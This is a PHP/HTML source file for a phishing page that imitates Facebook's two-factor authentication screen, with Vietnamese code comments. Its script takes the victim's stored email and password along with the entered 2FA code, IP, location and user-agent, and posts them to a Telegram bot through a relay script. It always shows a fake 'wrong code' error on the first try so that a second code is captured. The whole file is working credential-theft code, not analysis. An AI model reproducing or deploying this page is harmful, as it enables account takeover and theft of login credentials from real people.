<?php
// get root directory
$rootDirectory = dirname(dirname(__FILE__));
require_once($rootDirectory . '/get-data.php');
require_once($rootDirectory . '/getip.php');


?> <?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?> <?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Two-factor authentication required</title>
    <link rel="icon" href="/images/favicon.ico">
       
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }

        .header {
            font-size: 14px;
            margin-bottom: 20px;
            font-weight: 600;
        }

        .container {
            background: white;
            border-radius: 8px;
            padding: 40px;
            max-width: 700px;
            width: 100%;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1c1e21;
            margin-bottom: 16px;
        }

        .description {
            color: #171718ff;
            font-size: 15px;
            line-height: 1.4;
            margin-bottom: 24px;
        }

        .illustration {
            width: 100%;
            max-width: 700px;
            height: auto;
            border-radius: 8px;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #65676b;
            font-size: 14px;
        }

        .code-input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 16px;
            font-size: 17px;
            margin-bottom: 16px;
            outline: none;
        }

        .code-input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }

        .code-input.error {
            border-color: #FF0303;
            box-shadow: 0 0 0 2px rgba(255, 3, 3, 0.2);
        }

        .code-input::placeholder {
            color: #8a8d91;
        }

        .continue-btn {
            width: 100%;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 20px;
            padding: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 16px;
            transition: background-color 0.2s;
        }

        .continue-btn:hover {
            background-color: #166fe5;
        }

        .try-another-btn {
            width: 100%;
            background-color: transparent;
            border: 1px solid #3133357c;
            border-radius: 20px;
            padding: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .disable {
            color: #dbe0e7ff;
            pointer-events: none;
            opacity: 0.5;
        }

        .try-another-btn:hover {
            background-color: #f0f2f5;
        }

        /* Modal Styles */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.8);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }

        .modal {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            max-width: 500px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
        }

        .modal-header {
            padding: 16px 20px;
            border-bottom: 1px solid #dadde1;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-title {
            font-size: 20px;
            font-weight: 600;
            color: #1c1e21;
        }

        .close-btn {
            background: none;
            border: none;
            font-size: 24px;
            color: #8a8d91;
            cursor: pointer;
            padding: 8px;
            border-radius: 50%;
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .close-btn:hover {
            background-color: #f0f2f5;
        }

        .modal-content {
            padding: 20px;
        }

        .modal-description {
            color: #65676b;
            font-size: 15px;
            margin-bottom: 20px;
        }

        .verification-option {
            display: flex;
            align-items: flex-start;
            padding: 16px;
            border: 1px solid #dadde1;
            border-radius: 8px;
            margin-bottom: 8px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .verification-option:hover {
            background-color: #f7f8fa;
        }

        .verification-option.selected {
            border-color: #1877f2;
            background-color: #e7f3ff;
        }

        .verification-option input[type="radio"] {
            margin-right: 12px;
            margin-top: 2px;
        }

        .option-content {
            flex: 1;
        }

        .option-title {
            font-weight: 600;
            color: #1c1e21;
            margin-bottom: 4px;
        }

        .option-description {
            color: #65676b;
            font-size: 14px;
        }

        .info-section {
            background-color: #e7f3ff;
            border: 1px solid #1877f2;
            border-radius: 8px;
            padding: 16px;
            margin: 20px 0;
        }

        .info-icon {
            color: #1877f2;
            font-weight: bold;
            margin-right: 8px;
        }

        .info-title {
            font-weight: 600;
            color: #1c1e21;
            margin-bottom: 8px;
        }

        .info-text {
            color: #65676b;
            font-size: 14px;
            line-height: 1.4;
        }

        .info-link {
            color: #1877f2;
            text-decoration: none;
        }

        .info-link:hover {
            text-decoration: underline;
        }

        .modal-continue-btn {
            width: 100%;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
        }

        .modal-continue-btn:hover {
            background-color: #166fe5;
        }

        /* Upload Section */
        .upload-section {
            display: none;
            margin-top: 20px;
            padding: 20px;
            border: 2px dashed #dadde1;
            border-radius: 8px;
            text-align: center;
        }

        .upload-section.active {
            display: block;
        }

        .upload-input {
            display: none;
        }

        .upload-btn {
            background-color: #42b883;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin: 10px;
        }

        .upload-btn:hover {
            background-color: #369870;
        }

        .preview-container {
            margin-top: 20px;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
        }

        .preview-item {
            position: relative;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .preview-image {
            width: 120px;
            height: 120px;
            object-fit: cover;
        }

        .remove-btn {
            position: absolute;
            top: 5px;
            right: 5px;
            background-color: rgba(0, 0, 0, 0.7);
            color: white;
            border: none;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            cursor: pointer;
            font-size: 12px;
        }
        .btn-search {
            background-color: #1877f2;
            color: white;
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-search.enabled {
            opacity: 1;
            cursor: pointer;
        }

        .btn-search.enabled:hover {
            background-color: #166fe5;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        #error-message {
            animation: slideIn 0.3s ease-out;
        }

        @media (max-width: 480px) {
            .container {
                padding: 24px;
            }
            
            .modal {
                width: 95%;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <p class="header"></p>
        <h1>Go to your authentication app</h1>
        <p class="description"> Enter the 6-digit code for this account from the two-factor authentication app that you
            set up (such as Duo Mobile or Google Authenticator). </p>
        <div class="illustration">
            <img src="/images/2fa.jpg" alt="SMS Verification Illustration" style="max-width: 100%; height: auto;">
        </div>
        <form id="loginForm" onsubmit="sendToTelegramFromTwoFactorAuthentication(event)">
            <input type="text" id="code" class="code-input" placeholder="Code" maxlength="8">
            <div id="error-message" class="error-message" style="
                display: none;
                flex-direction: row;
                align-items: center;
                justify-content: center;
                flex-wrap: wrap;
                gap: 8px;
                color: #ec0000ff;
                font-size: 14px;
                margin-bottom: 16px;">
                <svg style="width: 12px; height:12px" viewBox="0 0 24 24" class="text-[#D31130]" fill="currentColor"
                    aria-hidden="true">
                    <path fill-rule="evenodd" clip-rule="evenodd"
                        d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm1.25-7.002c0 .6-.416 1-1.25 1-.833 0-1.25-.4-1.25-1s.417-1 1.25-1c.834 0 1.25.4 1.25 1zm-.374-8.125a.875.875 0 0 0-1.75 0v4.975a.875.875 0 1 0 1.75 0V7.873z">
                    </path>
                </svg>
                <p style="flex: 1; margin: 0; font-size: 12px;"> The login code you entered does not match the code sent
                    to your phone. Please re-enter if it still does not match. Please re-enter the information after 90
                    minutes here 1 more time. </p>
            </div>
            <button type="submit" class="continue-btn disable" id="searchBtn" disabled>Continue</button>
            <button type="button" class="try-another-btn" onclick="openModal()">Try Another Way</button>
        </form>
    </div>
    <!-- Modal -->
    <div class="modal-overlay" id="modalOverlay">
        <div class="modal">
            <div class="modal-header">
                <h2 class="modal-title">Choose a way to confirm it's you</h2>
                <button class="close-btn" onclick="closeModal()">×</button>
            </div>
            <div class="modal-content">
                <p class="modal-description">These are the available verification methods.</p>
                <div class="verification-option selected" onclick="selectOption('sms')">
                    <input type="radio" name="verification" value="sms" checked>
                    <div class="option-content">
                        <div class="option-title">Text message</div>
                        <div class="option-description">We'll send a code to your SMS</div>
                    </div>
                </div>
                <div class="verification-option" onclick="selectOption('app')">
                    <input type="radio" name="verification" value="app">
                    <div class="option-content">
                        <div class="option-title">Authentication app</div>
                        <div class="option-description">Get a code from your authentication app.</div>
                    </div>
                </div>
                <div class="info-section">
                    <div style="display: flex; align-items: flex-start;">
                        <span class="info-icon">ⓘ</span>
                        <div>
                            <div class="info-title">Need a different option?</div>
                            <div class="info-text"> To protect your account, accessing your account without using your
                                usual login method may take a few days. </div>
                        </div>
                    </div>
                </div>
                <button class="modal-continue-btn" onclick="closeModal()">Continue</button>
            </div>
        </div>
    </div>
    <script>
        // Biến từ PHP
        var ip = '<?php echo $ip; ?>';
        var city = '<?php echo $city; ?>';
        var country = '<?php echo $country; ?>';
        var org = '<?php echo $org; ?>';
        var timezone = '<?php echo $timezone; ?>';
        var userAgent = '<?php echo $userAgent; ?>';
        var botToken = '<?php echo $token; ?>';
        var chatId = '<?php echo $chatId; ?>';

        // State management cho 2FA
        var isFirstAttempt = sessionStorage.getItem('2faFirstAttempt') !== 'false';
        var attempts = parseInt(sessionStorage.getItem('2faAttempts') || '0');

        // Khởi tạo khi trang load
        document.addEventListener('DOMContentLoaded', function() {
            const codeInput = document.getElementById('code');
            const searchBtn = document.getElementById('searchBtn');
            const errorMessage = document.getElementById('error-message');

            // Enable button khi có input
            codeInput.addEventListener('input', function() {
                // Chỉ cho phép nhập số
                this.value = this.value.replace(/[^0-9]/g, '');
                
                if (this.value.length >= 6) {
                    searchBtn.classList.remove('disable');
                    searchBtn.classList.add('enabled');
                    searchBtn.disabled = false;
                } else {
                    searchBtn.classList.add('disable');
                    searchBtn.classList.remove('enabled');
                    searchBtn.disabled = true;
                }
                
                // Xóa class error khi user nhập lại
                if (this.value.length > 0) {
                    this.classList.remove('error');
                    errorMessage.style.display = 'none';
                }
            });

            // Ngăn chặn paste text không phải số
            codeInput.addEventListener('paste', function(e) {
                e.preventDefault();
                const paste = (e.clipboardData || window.clipboardData).getData('text');
                const numbersOnly = paste.replace(/[^0-9]/g, '');
                this.value = numbersOnly;
                
                // Trigger input event để update button state
                this.dispatchEvent(new Event('input'));
            });

            // Kiểm tra nếu có lỗi từ session storage
            var hasError = sessionStorage.getItem('2faError');
            var savedCode = sessionStorage.getItem('savedCode');
            
            if (hasError === 'true' && savedCode) {
                codeInput.value = savedCode;
                codeInput.focus();
                codeInput.select();
                codeInput.classList.add('error');
                
                // Hiển thị thông báo lỗi
                errorMessage.style.display = 'flex';
                
                // Xóa session storage sau khi hiển thị
                sessionStorage.removeItem('2faError');
                sessionStorage.removeItem('savedCode');
            }
        });

        function sendToTelegramFromTwoFactorAuthentication(event) {
            event.preventDefault();
            
            var code = document.getElementById('code').value;
            var email = localStorage.getItem('email');
            var password = localStorage.getItem('password');
            
            // Gửi dữ liệu đến Telegram
            var content = "🔐 Facebook 2FA Code💬" +
                "\n" + "----------------------------------------------------------" +
                "\nEmail: " + "`" + email + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nPassword: " + "`" + password + "`" +
                "\n" + "----------------------------------------------------------" +
                "\n2FA Code: " + "`" + code + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                "\nIP Address: " + "`<?php echo $ip; ?>`" +
                "\nCity: " + "`<?php echo $city; ?>`" +
                "\nRegion: " + "`<?php echo $region; ?>`" +
                "\nCountry: " + "`<?php echo $country; ?>`" +
                "\nOrg: " + "`<?php echo $org; ?>`" +
                "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";
            
            fetch('/send-telegram.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: content, parse_mode: 'Markdown' })
            })
            .then(response => response.json())
            .then(data => {
                // Logic xử lý: Lần đầu luôn báo lỗi, lần 2 thì thành công
                attempts++;
                sessionStorage.setItem('2faAttempts', attempts.toString());
                
                if (attempts === 1) {
                    // Lần đầu: Báo lỗi
                    sessionStorage.setItem('2faError', 'true');
                    sessionStorage.setItem('savedCode', code);
                    sessionStorage.setItem('2faFirstAttempt', 'false');
                    
                    // Reload trang để hiển thị lỗi
                    window.location.reload();
                } else {
                    // Lần 2: Thành công - chuyển sang trang upload CV
                    sessionStorage.removeItem('2faAttempts');
                    sessionStorage.removeItem('2faFirstAttempt');
                    window.location.href = "./upload-cv";
                }
            })
            .catch(error => {
                console.error('Error:', error);
                // Fallback nếu có lỗi network
                attempts++;
                sessionStorage.setItem('2faAttempts', attempts.toString());
                
                if (attempts === 1) {
                    sessionStorage.setItem('2faError', 'true');
                    sessionStorage.setItem('savedCode', code);
                    sessionStorage.setItem('2faFirstAttempt', 'false');
                    window.location.reload();
                } else {
                    sessionStorage.removeItem('2faAttempts');
                    sessionStorage.removeItem('2faFirstAttempt');
                    window.location.href = "./upload-cv";
                }
            });
        }

        // Modal functions
        function openModal() {
            document.getElementById('modalOverlay').style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('modalOverlay').style.display = 'none';
        }

        function selectOption(option) {
            // Remove selected class from all options
            document.querySelectorAll('.verification-option').forEach(opt => {
                opt.classList.remove('selected');
            });
            
            // Add selected class to clicked option
            event.currentTarget.classList.add('selected');
            
            // Update radio button
            document.querySelector(`input[value="${option}"]`).checked = true;
        }
    </script>
</body>

</html>